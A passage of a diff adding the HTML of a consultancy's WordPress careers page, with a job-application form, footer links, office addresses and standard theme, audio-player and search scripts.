+        <h3><span style="font-weight: 400;">WANT TO</span> <span style="font-weight: 900;"> WORK WITH US</span><span style="font-weight: 400;">?</span></h3>
+    </div>
+</div>
+<!-- /module text --><!-- module text -->
+<div  class="module module-text tb_wqaa308   " data-lazy="1">
+        <div  class="tb_text_wrap">
+        <p>If you are passionate about diverse problem solving and delivering lasting value to clients, please use this form to send us your details.</p>    </div>
+</div>
+<!-- /module text --><!-- module contact -->
+<div  id="tb_sio5580" class="module module-contact tb_sio5580 contact-animated-label  wow" data-tf-animation="zoomIn" data-lazy="1">
+    
+	<form class="builder-contact"
+		id="tb_sio5580-form"
+		method="post"
+		data-post-id="2893"
+		data-element-id="sio5580"
+		data-orig-id="2893"
+	>
+    <div class="contact-message"></div>
+	<div class="builder-contact-fields tf_rel">
+		    		    <div class="builder-contact-field builder-contact-field-name builder-contact-text-field">
+			    <label class="control-label" for="tb_sio5580-contact-name">
+										<span class="tb-label-span">Full Name </span><span class="required">*</span>				</label>
+			    <div class="control-input tf_rel">
+				    					    <input type="text" name="contact-name" placeholder=" " id="tb_sio5580-contact-name" value="" class="form-control" required>
+				    				    					    <span class="tb_contact_label">
+						    <span class="tb-label-span">Full Name </span><span class="required">*</span>					    </span>
+				    			    </div>
+		</div>
+	    
+		    		    <div class="builder-contact-field builder-contact-field-email builder-contact-text-field">
+			    <label class="control-label" for="tb_sio5580-contact-email">
+										<span class="tb-label-span">Email ID </span><span class="required">*</span>				</label>
+			    <div class="control-input tf_rel">
+				    					    <input type="email" name="contact-email" placeholder=" " id="tb_sio5580-contact-email" value="" class="form-control" required>
+				    				    					    <span class="tb_contact_label">
+						    <span class="tb-label-span">Email ID </span><span class="required">*</span>					    </span>
+				    			    </div>
+		</div>
+	    
+		    		    		    <div class="builder-contact-field builder-contact-field-extra builder-contact-text-field builder-contact-tel-field">
+				
+				<label class="control-label" for="field_extra_tb_sio5580_0">
+					
+					Mobile No.											<input type="hidden" name="field_extra_name_0" value="Mobile No.">
+											<span class="required">*</span>
+									</label>
+				<div class="control-input tf_rel">
+											<input type="tel" name="field_extra_0" id="field_extra_tb_sio5580_0" placeholder=" " class="form-control" required>
+					
+											<span class="tb_contact_label">
+							Mobile No.								<span class="required">*</span>
+													</span>
+									</div>
+		    </div>
+	    
+		    		    		    <div class="builder-contact-field builder-contact-field-extra builder-contact-select-field">
+				
+				<label class="control-label" for="field_extra_tb_sio5580_1">
+					
+					Employment Category											<input type="hidden" name="field_extra_name_1" value="Employment Category">
+									</label>
+				<div class="control-input tf_rel">
+																		<select id="field_extra_tb_sio5580_1" name="field_extra_1" class="form-control tf_scrollbar">
+																	<option value=""></option>
+																									<option value="Permanent"> Permanent </option>
+																	<option value="Contractor"> Contractor </option>
+															</select>
+											
+									</div>
+		    </div>
+	    
+		    		    		    <div class="builder-contact-field builder-contact-field-extra builder-contact-upload-field">
+				
+				<label class="control-label" for="field_extra_tb_sio5580_2">
+					
+					Upload Your Resume											<input type="hidden" name="field_extra_name_2" value="Upload Your Resume">
+									</label>
+				<div class="control-input tf_rel">
+											<input type="file" name="field_extra_2" id="field_extra_tb_sio5580_2" placeholder=" " class="form-control">
+					
+									</div>
+		    </div>
+	    
+		    		    		    <div class="builder-contact-field builder-contact-field-extra builder-contact-textarea-field">
+				
+				<label class="control-label" for="field_extra_tb_sio5580_3">
+					
+					Tell us a bit about yourself...											<input type="hidden" name="field_extra_name_3" value="Tell us a bit about yourself...">
+									</label>
+				<div class="control-input tf_rel">
+											<textarea name="field_extra_3" id="field_extra_tb_sio5580_3" placeholder=" " class="form-control"></textarea>
+					
+											<span class="tb_contact_label">
+							Tell us a bit about yourself...						</span>
+									</div>
+		    </div>
+	    
+		    		
+		
+	    
+	    <div class="builder-contact-field builder-contact-field-send control-input tf_textr tf_clear tf_rel">
+			<button type="submit" class="btn btn-primary">
+				<span class="tf_loader"></span>				<span class="tf_submit_icon"></span> 
+				SEND MESSAGE			</button>
+	    </div>
+	</div>
+    </form>
+    </div>
+<!-- /module contact -->
+        </div>
+                    </div>
+                </div>
+                        </div>
+        </div>
+        </div>
+<!--/themify_builder_content-->            <!-- /comments -->
+        </div>
+        <!-- /.post-content -->
+                        </div>
+                <!-- /.type-page -->
+                    </main>
+    <!-- /content -->
+    </div>
+<!-- /layout-container -->
+    </div><!-- /body -->
+<div class="back-top tf_textc tf_clearfix back-top-float back-top-hide"><div class="arrow-up"><a aria-label="Back to top" href="#header"><span class="screen-reader-text">Back To Top</span></a></div></div></div><!-- /#pagewrap -->
+<!-- hook content: themify_body_end --><div class="tb_layout_part_wrap tf_w">
+<!--themify_builder_content-->
+    <div  class="themify_builder_content themify_builder_content-3091 themify_builder not_editable_builder" data-postid="3091">
+                        <div  data-css_id="2enz482" data-lazy="1" class="module_row themify_builder_row fullwidth tb_2enz482 tf_w">
+            <span  class="builder_row_cover tf_abs" data-lazy="1"></span>            <div class="row_inner col_align_top tb_col_count_1 tf_box tf_rel">
+                        <div  data-lazy="1" class="module_column tb-column col-full tb_jkg3432 first">
+                            <div  data-lazy="1" class="module_subrow themify_builder_sub_row tf_w col_align_top tb_col_count_2 tb_77l3353">
+                <div  data-lazy="1" class="module_column sub_column col4-2 tb_9z8n443 first">
+                    <!-- module image -->
+<div  class="module module-image tb_mvgc010 image-top   tf_mw" data-lazy="1">
+        <div class="image-wrap tf_rel tf_mw">
+            <img data-tf-not-load="1" decoding="async" src="https://hexadvisory.com/wp-content/uploads/2026/01/HEX-Logo-2026-165x82.png" width="165" height="82" class="wp-post-image wp-image-7312" title="HEX-Logo-2026" alt="HEX-Logo-2026" srcset="https://hexadvisory.com/wp-content/uploads/2026/01/HEX-Logo-2026-165x82.png 165w, https://hexadvisory.com/wp-content/uploads/2026/01/HEX-Logo-2026.png 720w" sizes="(max-width: 165px) 100vw, 165px" />    
+        </div>
+    <!-- /image-wrap -->
+    
+        </div>
+<!-- /module image --><!-- module text -->
+<div  class="module module-text tb_as8r710   " data-lazy="1">
+        <div  class="tb_text_wrap">
+        <p><a href="https://hexadvisory.com/contact/">Contact Us</a></p>
+<p><a href="https://hexadvisory.com/careers/">Careers</a></p>
+<p><a href="https://hexadvisory.com/privacy-policy/">Privacy Policy</a></p>
+<p><a href="https://www.linkedin.com/company/hexadvisorygroup/" target="_blank" rel="noopener">LinkedIn</a></p>
+<p><a href="https://hexadvisory.com/blog/category/perspectives/">Perspectives</a></p>    </div>
+</div>
+<!-- /module text -->        </div>
+                    <div  data-lazy="1" class="module_column sub_column col4-2 tb_twg7644 last">
+                    <!-- module text -->
+<div  class="module module-text tb_3keq740   " data-lazy="1">
+        <div  class="tb_text_wrap">
+        <p style="cursor: text; text-align: right;">45, Rockefeller Plaza<br>Suite 2000<br>New York, NY 10111<br>USA</p>    </div>
+</div>
+<!-- /module text --><!-- module text -->
+<div  class="module module-text tb_2kt6137   " data-lazy="1">
+        <div  class="tb_text_wrap">
+        <p style="text-align: right;">Level 18, DLF Cyber City<br>Building No. 5<br>Gurgaon &#8211; 122101<br>India</p>    </div>
+</div>
+<!-- /module text -->        </div>
+                    </div>
+                <div  data-lazy="1" class="module_subrow themify_builder_sub_row tf_w col_align_top tb_col_count_1 tb_ljfx802">
+                <div  data-lazy="1" class="module_column sub_column col-full tb_kxir055 first">
+                    <!-- module text -->
+<div  class="module module-text tb_b8fl440   " data-lazy="1">
+        <div  class="tb_text_wrap">
+        <p style="text-align: center;">© Copyright Hex Advisory Group. All rights reserved worldwide.</p>    </div>
+</div>
+<!-- /module text -->        </div>
+                    </div>
+                </div>
+                        </div>
+        </div>
+                        <div  data-lazy="1" class="module_row themify_builder_row tb_tas9001 tf_w">
+                        <div class="row_inner col_align_top tb_col_count_1 tf_box tf_rel">
+                        <div  data-lazy="1" class="module_column tb-column col-full tb_m28b465 first">
+                            </div>
+                        </div>
+        </div>
+            </div>
+<!--/themify_builder_content-->
+</div>
+<!-- /hook content: themify_body_end --><!-- wp_footer -->
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/themify-ultra-child/*","/wp-content/themes/themify-ultra/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+
+<!-- WP Audio player plugin v1.9.15 - https://www.tipsandtricks-hq.com/wordpress-audio-music-player-plugin-4556/ -->
+    <script type="text/javascript">
+        soundManager.useFlashBlock = true; // optional - if used, required flashblock.css
+        soundManager.url = 'https://hexadvisory.com/wp-content/plugins/compact-wp-audio-player/swf/soundmanager2.swf';
+        function play_mp3(flg, ids, mp3url, volume, loops)
+        {
+            //Check the file URL parameter value
+            var pieces = mp3url.split("|");
+            if (pieces.length > 1) {//We have got an .ogg file too
+                mp3file = pieces[0];
+                oggfile = pieces[1];
+                //set the file URL to be an array with the mp3 and ogg file
+                mp3url = new Array(mp3file, oggfile);
+            }
+
+            soundManager.createSound({
+                id: 'btnplay_' + ids,
+                volume: volume,
+                url: mp3url
+            });
+
+            if (flg == 'play') {
+                    soundManager.play('btnplay_' + ids, {
+                    onfinish: function() {
+                        if (loops == 'true') {
+                            loopSound('btnplay_' + ids);
+                        }
+                        else {
+                            document.getElementById('btnplay_' + ids).style.display = 'inline';
+                            document.getElementById('btnstop_' + ids).style.display = 'none';
+                        }
+                    }
+                });
+            }
+            else if (flg == 'stop') {
+    //soundManager.stop('btnplay_'+ids);
+                soundManager.pause('btnplay_' + ids);
+            }
+        }
+        function show_hide(flag, ids)
+        {
+            if (flag == 'play') {
+                document.getElementById('btnplay_' + ids).style.display = 'none';
+                document.getElementById('btnstop_' + ids).style.display = 'inline';
+            }
+            else if (flag == 'stop') {
+                document.getElementById('btnplay_' + ids).style.display = 'inline';
+                document.getElementById('btnstop_' + ids).style.display = 'none';
+            }
+        }
+        function loopSound(soundID)
+        {
+            window.setTimeout(function() {
+                soundManager.play(soundID, {onfinish: function() {
+                        loopSound(soundID);
+                    }});
+            }, 1);
+        }
+        function stop_all_tracks()
+        {
+            soundManager.stopAll();
+            var inputs = document.getElementsByTagName("input");
+            for (var i = 0; i < inputs.length; i++) {
+                if (inputs[i].id.indexOf("btnplay_") == 0) {
+                    inputs[i].style.display = 'inline';//Toggle the play button
+                }
+                if (inputs[i].id.indexOf("btnstop_") == 0) {
+                    inputs[i].style.display = 'none';//Hide the stop button
+                }
+            }
+        }
+    </script>
+                <!--googleoff:all-->
+            <!--noindex-->
+            <!--noptimize-->
+            <script id="tf_vars" data-no-optimize="1" data-noptimize="1" data-no-minify="1" data-cfasync="false" defer="defer" src="data:text/javascript;base64,dmFyIHRoZW1pZnlTY3JpcHQgPSB7ImhlYWRlclR5cGUiOiJoZWFkZXItaG9yaXpvbnRhbCIsInN0aWNreV9oZWFkZXIiOnsiaWQiOjczMTIsInNyYyI6Imh0dHBzOi8vaGV4YWR2aXNvcnkuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDI2LzAxL0hFWC1Mb2dvLTIwMjYucG5nIiwiaW1nd2lkdGgiOiIxMzAiLCJpbWdoZWlnaHQiOiI2NSJ9LCJwYWdlTG9hZGVyRWZmZWN0IjoiIiwiaW5maW5pdGVFbmFibGUiOiIwIn07CnZhciB0YkxvY2FsU2NyaXB0ID0geyJzY3JvbGxIaWdobGlnaHQiOnsic3BlZWQiOjkwMC4wMX0sImFkZG9ucyI6eyJjb250YWN0Ijp7ImpzIjoiaHR0cHM6Ly9oZXhhZHZpc29yeS5jb20vd3AtY29udGVudC9wbHVnaW5zL2J1aWxkZXItY29udGFjdC9hc3NldHMvc2NyaXB0cyIsInZlciI6IjMuNS45In19fTsKdmFyIHRoZW1pZnlfdmFycyA9IHsibWVudV9wb2ludCI6IjExMDAiLCJicmVha3BvaW50cyI6eyJ0YWJsZXRfbGFuZHNjYXBlIjpbNzY5LDEwMjRdLCJ0YWJsZXQiOls2MDEsNzY4XSwibW9iaWxlIjo2MDB9LCJ3cCI6IjYuOSIsImFqYXhfdXJsIjoiaHR0cHM6Ly9oZXhhZHZpc29yeS5jb20vd3AtYWRtaW4vYWRtaW4tYWpheC5waHAiLCJhenVyZV9rZXkiOiIiLCJtZW51X3Rvb2x0aXBzIjpbXSwicGx1Z2luX3VybCI6Imh0dHBzOi8vaGV4YWR2aXNvcnkuY29tL3dwLWNvbnRlbnQvcGx1Z2lucyIsImNvbnRlbnRfdXJsIjoiaHR0cHM6Ly9oZXhhZHZpc29yeS5jb20vd3AtY29udGVudCIsImluY2x1ZGVzX3VybCI6Imh0dHBzOi8vaGV4YWR2aXNvcnkuY29tL3dwLWluY2x1ZGVzLyIsImxhenlfdGhyZXNob2xkIjoiMzAwIiwidGhlbWVfdiI6IjguMC44IiwiZW1haWxTdWIiOiJDaGVjayB0aGlzIG91dCEiLCJub3AiOiJDaGVjayB0aGlzIG91dCEiLCJsaWdodGJveCI6eyJkaXNhYmxlX3NoYXJpbmciOnRydWUsImkxOG4iOnsidENvdW50ZXIiOiIlY3VyciUgb2YgJXRvdGFsJSJ9fSwiZG9uZSI6eyJ0Yl90YnAiOnRydWUsInRmX21lZ2FtZW51Ijp0cnVlLCJ0Yl9pY29uIjp0cnVlLCJ0Yl90ZXh0Ijp0cnVlLCJ0Yl9jb250YWN0Ijp0cnVlLCJ0Yl9zdHlsZSI6dHJ1ZSwidGJfY292ZXIiOnRydWUsInRiX2ltYWdlIjp0cnVlLCJ0Yl9pbWFnZV90b3AiOnRydWV9fTs="></script>
+            <!--/noptimize-->
+            <!--/noindex-->
+            <!--googleon:all-->
+            <script defer="defer" data-v="8.2.0" data-pl-href="https://hexadvisory.com/wp-content/plugins/fake.css" data-no-optimize="1" data-noptimize="1" src="https://hexadvisory.com/wp-content/themes/themify-ultra/themify/js/main.js?ver=8.2.0" id="themify-main-script-js"></script>
+<script id="ivory-search-scripts-js-extra">
+var IvorySearchVars = {"is_analytics_enabled":"1"};
+//# sourceURL=ivory-search-scripts-js-extra
+</script>
+<script src="https://hexadvisory.com/wp-content/plugins/add-search-to-menu/public/js/ivory-search.min.js?ver=5.5.13" id="ivory-search-scripts-js"></script>
+
+
+<!-- SCHEMA BEGIN --><script type="application/ld+json">[{"@context":"https:\/\/schema.org","@type":"WebPage","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/hexadvisory.com\/careers\/"},"headline":"Careers","datePublished":"2022-09-16T15:13:18+00:00","dateModified":"2024-04-20T04:07:01+00:00","description":""}]</script><!-- /SCHEMA END -->	</body>
+</html>
+
+
+<!-- Page cached by LiteSpeed Cache 7.7 on 2026-01-21 10:59:57 -->
